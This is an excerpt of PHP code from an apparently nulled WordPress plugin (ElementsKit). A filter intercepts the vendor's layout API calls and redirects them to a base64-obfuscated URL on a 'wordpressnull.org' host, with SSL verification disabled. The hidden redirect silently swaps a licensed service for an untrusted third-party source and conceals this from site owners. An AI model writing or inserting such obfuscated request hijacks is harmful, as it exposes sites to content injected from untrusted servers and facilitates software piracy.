	...
	add_filter( 'pre_http_request', function( $pre, $parsed_args, $url ) {
		if ( strpos( $url, 'https://api.wpmet.com/public/layout-manager-api/' ) !== false ) {
			...
			if ( isset( $url_args['action'] ) && ( $url_args['action'] == 'get_layout_data' ) ) {
				$encoded_url = "aHR0cDovL3dvcmRwcmVzc251bGwub3JnL2VsZW1lbnRza2l0L2xheW91dHMv";
				$response = wp_remote_get( base64_decode($encoded_url) . "{$url_args['layout_id']}.json", [ 'sslverify' => false, 'timeout' => 30 ] );
